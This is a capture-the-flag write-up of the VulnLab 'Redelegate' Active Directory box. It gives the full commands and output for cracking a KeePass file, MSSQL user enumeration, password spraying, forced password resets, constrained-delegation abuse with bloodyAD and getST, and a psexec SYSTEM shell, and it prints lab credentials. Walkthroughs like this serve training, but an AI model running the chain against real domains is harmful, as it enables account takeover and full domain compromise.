---
title: VulnLab Redelegate
description: VulnLab Redelegate
image:
  path: redelegate.png
categories:
- VulnLab Boxes
- Active Directory
layout: post
media_subpath: /assets/posts/labs/vulnlab/boxes/redelegate
tags:
- vulnlab-boxes
- active-directory
---
# Redelegate
## Recon
```
└─$ rustscan -g -a 10.10.112.26 -r 1-65535
10.10.112.26 -> [21,53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5357,5985,3389,9389,47001,49664,49665,49666,49667,49672,49668,49675,49676,49932,53564,56281,56293,56295]
```
```
└─$ nmap -sC -sV -p21,53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5357,5985,3389,9389,47001,49664,49665,49666,49667,49672,49668,49675,49676,49932,53564,56281,56293,56295 10.10.112.26
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-30 18:51 +05
Nmap scan report for 10.10.112.26
Host is up (0.093s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-20-24  12:11AM                  434 CyberAudit.txt
| 10-20-24  04:14AM                 2622 Shared.kdbx
|_10-20-24  12:26AM                  580 TrainingAgenda.txt
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-30 13:50:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.112.26:1433: 
|     Target_Name: REDELEGATE
|     NetBIOS_Domain_Name: REDELEGATE
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: redelegate.vl
|     DNS_Computer_Name: dc.redelegate.vl
|     DNS_Tree_Name: redelegate.vl
|_    Product_Version: 10.0.20348
|_ssl-date: 2024-12-30T13:51:53+00:00; -1m19s from scanner time.
| ms-sql-info: 
|   10.10.112.26:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-12-30T13:41:13
|_Not valid after:  2054-12-30T13:41:13
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-12-30T13:51:52+00:00; -1m20s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: REDELEGATE
|   NetBIOS_Domain_Name: REDELEGATE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: redelegate.vl
|   DNS_Computer_Name: dc.redelegate.vl
|   DNS_Tree_Name: redelegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-12-30T13:51:41+00:00
| ssl-cert: Subject: commonName=dc.redelegate.vl
| Not valid before: 2024-10-30T13:31:09
|_Not valid after:  2025-05-01T13:31:09
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49932/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.112.26:49932: 
|     Target_Name: REDELEGATE
|     NetBIOS_Domain_Name: REDELEGATE
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: redelegate.vl
|     DNS_Computer_Name: dc.redelegate.vl
|     DNS_Tree_Name: redelegate.vl
|_    Product_Version: 10.0.20348
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-12-30T13:41:13
|_Not valid after:  2054-12-30T13:41:13
| ms-sql-info: 
|   10.10.112.26:49932: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 49932
|_ssl-date: 2024-12-30T13:51:52+00:00; -1m20s from scanner time.
53564/tcp open  msrpc         Microsoft Windows RPC
56281/tcp open  msrpc         Microsoft Windows RPC
56293/tcp open  msrpc         Microsoft Windows RPC
56295/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-12-30T13:51:45
|_  start_date: N/A
|_clock-skew: mean: -1m19s, deviation: 0s, median: -1m19s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.08 seconds

```
## User
We can't perform anonymous bind/authentication to `LDAP`/`SMB`. But we see `FTP` port, which is odd on Domain Controller. Let's check it
```
└─$ ftp anonymous@10.10.112.26
Connected to 10.10.112.26.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||60209|)
125 Data connection already open; Transfer starting.
10-20-24  12:11AM                  434 CyberAudit.txt
10-20-24  04:14AM                 2622 Shared.kdbx
10-20-24  12:26AM                  580 TrainingAgenda.txt
226 Transfer complete.
ftp> 
```

We see `kdbx` file which could contain something interesting, so let's download all files.
```
ftp> binary
200 Type set to I.
ftp> prompt off
Interactive mode off.
ftp> mget *
local: CyberAudit.txt remote: CyberAudit.txt
229 Entering Extended Passive Mode (|||60225|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************|   434        4.73 KiB/s    00:00 ETA
226 Transfer complete.
434 bytes received in 00:00 (4.71 KiB/s)
local: Shared.kdbx remote: Shared.kdbx
229 Entering Extended Passive Mode (|||60226|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************|  2622       28.42 KiB/s    00:00 ETA
226 Transfer complete.
2622 bytes received in 00:00 (28.31 KiB/s)
local: TrainingAgenda.txt remote: TrainingAgenda.txt
229 Entering Extended Passive Mode (|||60227|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************|   580        6.32 KiB/s    00:00 ETA
226 Transfer complete.
580 bytes received in 00:00 (6.26 KiB/s)
ftp> exit
221 Goodbye.
```

The interesting note regarding passwords
```
└─$ cat TrainingAgenda.txt 
EMPLOYEE CYBER AWARENESS TRAINING AGENDA (OCTOBER 2024)
<SNIP>

Friday 18th October | 11.30 - 13.30 - 7 attendees
"Weak Passwords" - Why "SeasonYear!" is not a good password 

<SNIP>
```

Could be a hint for a password to keepass database, let's generate password list
```
Spring2024!
Summer2024!
Autumn2024!
Winter2024!
<REDACTED>
```

Let's crack it using 
```
└─$ keepass2john ftp/Shared.kdbx > keepass_hash
```
```
└─$ cat keepass_hash      
Shared:$keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*e4f9d51a5df3e5f9ca1019cd57e10d60f85f48228da3f3b4cf1ffee940e20e01*18c45dbbf7d365a13d6714059937ebad*a59af7b75908d7bdf68b6fd929d315ae6bfe77262e53c209869a236da830495f*806f9dd2081c364e66a114ce3adeba60b282fc5e5ee6f324114d38de9b4502ca
```
```
└─$ john keepass_hash -w=passwords.txt                                                 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 600000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<REDACTED>        (Shared)     
1g 0:00:00:00 DONE (2024-12-30 19:08) 3.333g/s 16.66p/s 16.66c/s 16.66C/s Spring2024!..<REDACTED>
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We cracked the hash and found credentials inside database file
```
└─$ kpcli                

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> open ftp/Shared.kdbx 
Provide the master password: *************************
kpcli:/> ls
=== Groups ===
Shared/
kpcli:/> cd Shared
kpcli:/Shared> ls
=== Groups ===
Finance/
HelpDesk/
IT/
<SNIP>
kpcli:/Shared/IT> show -f 2

Title: SQL Guest Access
Uname: SQLGuest
 Pass: <REDACTED>
  URL: 
Notes: 
```
We can also use `keepassxc-cli`
```
└─$ keepassxc-cli export ftp/Shared.kdbx --format csv
Enter password to unlock ftp/Shared.kdbx: 
KdbxXmlReader::readDatabase: found 1 invalid group reference(s)
"Group","Title","Username","Password","URL","Notes","TOTP","Icon","Last Modified","Created"
"Shared/IT","FTP","FTPUser","SguPZBKdRyxWzvXRWy6U","","Deprecated","","0","2024-10-20T07:56:58Z","2024-10-20T07:56:20Z"
"Shared/IT","FS01 Admin","Administrator","Spdv41gg4BlBgSYIW1gF","","","","0","2024-10-20T07:57:21Z","2024-10-20T07:57:02Z"
"Shared/IT","WEB01","WordPress Panel","cn4KOEgsHqvKXPjEnSD9","","","","0","2024-10-20T08:00:25Z","2024-10-20T07:57:24Z"
"Shared/IT","SQL Guest Access","SQLGuest","<REDACTED>","","","","0","2024-10-20T08:27:09Z","2024-10-20T08:26:48Z"
"Shared/HelpDesk","KeyFob Combination","","22331144","","","","0","2024-10-20T12:12:32Z","2024-10-20T12:12:09Z"
"Shared/Finance","Timesheet Manager","Timesheet","hMFS4I0Kj8Rcd62vqi5X","","","","0","2024-10-20T12:14:18Z","2024-10-20T12:13:30Z"
"Shared/Finance","Payrol App","Payroll","cVkqz4bCM7kJRSNlgx2G","","","","0","2024-10-20T12:14:11Z","2024-10-20T12:13:50Z"
```

We saw `mssql` running during scan. The creds for `sqlguest` work
```
└─$ mssqlclient.py SQLGuest:'<REDACTED>'@10.10.112.26                              
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SQLGuest  guest@master)> 
```

`xp_dirtree` works, but we can't crack the hash for `sql_svc`. There is another way to enumerate domain described in this [blog](https://www.netspi.com/blog/technical-blog/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/). 
```
SQL (SQLGuest  guest@master)> SELECT DEFAULT_DOMAIN();
             
----------   
REDELEGATE   
```
We can retrieve the RID of the `Domain Admins`, since it also contains the SID of the domain (first 48 bytes), we can use it to enumerate users.
```
SQL (SQLGuest  guest@master)> SELECT SUSER_SID('REDELEGATE\Domain Admins')
                                                              
-----------------------------------------------------------   
b'010500000000000515000000a185deefb22433798d8e847a00020000'   

SQL (SQLGuest  guest@master)> 
```
We can use this python script to convert it to SID
```
def hex_to_sid(hex_string):
    # Split the hex string into bytes
    hex_bytes = bytes.fromhex(hex_string)

    # Extract the SID components
    revision = hex_bytes[0]
    sub_authority_count = hex_bytes[1]
    identifier_authority = hex_bytes[2:8]
    sub_authorities = hex_bytes[8:]

    # Convert identifier authority to its decimal form
    identifier_authority_dec = int.from_bytes(identifier_authority, 'big')

    # Generate the SID string
    sid = f"S-{revision}-{identifier_authority_dec}"
    for i in range(sub_authority_count):
        sub_auth = int.from_bytes(sub_authorities[i * 4: (i + 1) * 4], 'little')
        sid += f"-{sub_auth}"

    return sid


# Example hex string from SQL Server
hex_string = "010500000000000515000000a185deefb22433798d8e847a00020000"
sid = hex_to_sid(hex_string)
print("SID:", sid)
```

Since we now domain SID, we can use enumerate the users. But to do that we have create a script. We can use the following query: `SELECT SUSER_SNAME(SID_BINARY(N'<DOMAIN_SID>-<RID>'))` to query users
```
└─$ for SID in {500..1200}; do (echo "SELECT SUSER_SNAME(SID_BINARY(N'S-1-5-21-4024337825-2033394866-2055507597-$SID'))" >> queries.txt); done
```
After generating the list of queries, we can now input it to `mssqlclient.py`
```
└─$ mssqlclient.py SQLGuest:'<REDACTED>'@10.10.112.26 -f queries.txt >> user-enumeration.txt
```
Now we have users and groups list
```
└─$ cat user-enumeration.txt | grep -a 'REDELEGATE'
REDELEGATE\Guest   
REDELEGATE\krbtgt   
REDELEGATE\Domain Admins   
REDELEGATE\Domain Users   
REDELEGATE\Domain Guests   
REDELEGATE\Domain Computers   
REDELEGATE\Domain Controllers   
REDELEGATE\Cert Publishers   
REDELEGATE\Schema Admins   
REDELEGATE\Enterprise Admins   
REDELEGATE\Group Policy Creator Owners   
REDELEGATE\Read-only Domain Controllers   
REDELEGATE\Cloneable Domain Controllers   
REDELEGATE\Protected Users   
REDELEGATE\Key Admins   
REDELEGATE\Enterprise Key Admins   
REDELEGATE\RAS and IAS Servers   
REDELEGATE\Allowed RODC Password Replication Group   
REDELEGATE\Denied RODC Password Replication Group   
REDELEGATE\SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG   
REDELEGATE\DC$   
REDELEGATE\FS01$   
REDELEGATE\Christine.Flanders   
REDELEGATE\Marie.Curie   
REDELEGATE\Helen.Frost   
REDELEGATE\Michael.Pontiac   
REDELEGATE\Mallory.Roberts   
REDELEGATE\James.Dinkleberg   
REDELEGATE\Helpdesk   
REDELEGATE\IT   
REDELEGATE\Finance   
REDELEGATE\DnsAdmins   
REDELEGATE\DnsUpdateProxy   
REDELEGATE\Ryan.Cooper   
REDELEGATE\sql_svc 
```

Users
```
└─$ cat users.txt 
Ryan.Cooper
sql_svc
Christine.Flanders
Marie.Curie
Helen.Frost
Michael.Pontiac
Mallory.Roberts
James.Dinkleberg
```

We can try password spraying using password scheme that was mentioned in the note
```
└─$ nxc smb 10.10.112.26  -u users.txt -p passwords.txt --continue-on-success
SMB         10.10.112.26    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)
SMB         10.10.112.26    445    DC               [-] redelegate.vl\Ryan.Cooper:Spring2024! STATUS_LOGON_FAILURE 
<SNIP>
SMB         10.10.112.26    445    DC               [+] redelegate.vl\Marie.Curie:<REDACTED> 
<SNIP>
```

Since we have valid creds, let's enumerate domain using `bloodhound`
```
└─$ bloodhound-python -d 'redelegate.vl' -u 'Marie.Curie' -p '<REDACTED>' -c all -ns 10.10.112.26 --zip
INFO: Found AD domain: redelegate.vl
<SNIP>
```

We have interesting path from `Marie.Curie` to `Helen.Frost` who can `PSRemote` to `DC`

![](1.png)

![](2.png)

Let's change `Helen`'s password
```
└─$ changepasswd.py redelegate/helen.frost@10.10.112.26 -newpass 'P@ssw0rd!' -altuser redelegate/marie.curie -reset -altpass '<REDACTED>' -dc-ip 10.10.112.26
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Setting the password of redelegate\helen.frost as redelegate\marie.curie
[*] Connecting to DCE/RPC as redelegate\marie.curie
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.

```
```
└─$ nxc smb 10.10.112.26  -u 'Helen.Frost' -p 'P@ssw0rd!'                                    
SMB         10.10.112.26    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)
SMB         10.10.112.26    445    DC               [+] redelegate.vl\Helen.Frost:P@ssw0rd!
```

And now we can use `evil-winrm`
```
└─$ evil-winrm -u helen.frost -p 'P@ssw0rd!' -i 10.10.112.26                       
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> 
```
## Root
We see that we have `SeEnableDelegationPrivilege`, which means that we can enable delegations in the domain
```
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== ==============================================
redelegate\helen.frost S-1-5-21-4024337825-2033394866-2055507597-1106


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
REDELEGATE\IT                               Group            S-1-5-21-4024337825-2033394866-2055507597-1113 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

We know that `Helen` has `GenericAll` rights over `FS01`, which can be used for the attack. We will be using `Constrained Delegation`. `Unconstrained Delegation` will require us to create a DNS entry and ability to add computers (The MachineAccountQuota is 0 in this case). Let's first change `FS01`'s password
```
└─$ changepasswd.py redelegate/'fs01$'@10.10.112.26 -newpass 'P@ssw0rd!' -altuser redelegate/helen.frost -reset -altpass 'P@ssw0rd!' -dc-ip 10.10.112.26
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Setting the password of redelegate\fs01$ as redelegate\helen.frost
[*] Connecting to DCE/RPC as redelegate\helen.frost
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.

```

Now we have to set `SPN` using `Powershell`/`Powerview`
```
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> Set-ADObject -Identity "CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL" -Add @{"msDS-AllowedToDelegateTo"="cifs/dc.redelegate.vl"}
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
```
or from linux
```
└─$ python3 ~/tools/red-team/bloodyAD/bloodyAD.py -u 'helen.frost' -d 'redelegate.vl' -p 'P@ssw0rd!' --host 'dc.redelegate.vl' set object 'fs01$' 'msDS-AllowedToDelegateTo' -v 'cifs/dc.redelegate.vl'
[+] fs01$'s msDS-AllowedToDelegateTo has been updated
```
```
└─$ python3 ~/tools/red-team/bloodyAD/bloodyAD.py -u 'helen.frost' -d 'redelegate.vl' -p 'P@ssw0rd!' --host 'dc.redelegate.vl' get object 'fs01$' --attr 'msDS-AllowedToDelegateTo'                           

distinguishedName: CN=FS01,CN=Computers,DC=redelegate,DC=vl
msDS-AllowedToDelegateTo: cifs/dc.redelegate.vl
```
```
└─$ python3 ~/tools/red-team/bloodyAD/bloodyAD.py -u 'helen.frost' -d 'redelegate.vl' -p 'P@ssw0rd!' --host 'dc.redelegate.vl' add uac 'fs01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION                                      
[-] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to fs01$'s userAccountControl
```
```
└─$ python3 ~/tools/red-team/bloodyAD/bloodyAD.py -u 'helen.frost' -d 'redelegate.vl' -p 'P@ssw0rd!' --host 'dc.redelegate.vl' get object 'fs01$' --attr userAccountControl

distinguishedName: CN=FS01,CN=Computers,DC=redelegate,DC=vl
userAccountControl: WORKSTATION_TRUST_ACCOUNT; TRUSTED_TO_AUTH_FOR_DELEGATION

```

Now, we can perform delegation (Note that, `Administrator` cannot be delegated)

![](3.png)

But we can impersonate `Ryan.Cooper` who is `Domain Admin`. Let's craft TGS
```
└─$ getST.py -spn cifs/dc.redelegate.vl 'redelegate.vl/fs01$':'P@ssw0rd!' -impersonate ryan.cooper
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating ryan.cooper
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in ryan.cooper@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
```

Use ticket to `psexec`
```
└─$ KRB5CCNAME=ryan.cooper@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache psexec.py -k -no-pass dc.redelegate.vl
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.redelegate.vl.....
[*] Found writable share ADMIN$
[*] Uploading file owaGlDso.exe
[*] Opening SVCManager on dc.redelegate.vl.....
[*] Creating service Eugv on dc.redelegate.vl.....
[*] Starting service Eugv.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 

```

[https://api.vulnlab.com/api/v1/share?id=c4bfad12-e23d-43bd-b12f-6e2465d11242](https://api.vulnlab.com/api/v1/share?id=c4bfad12-e23d-43bd-b12f-6e2465d11242)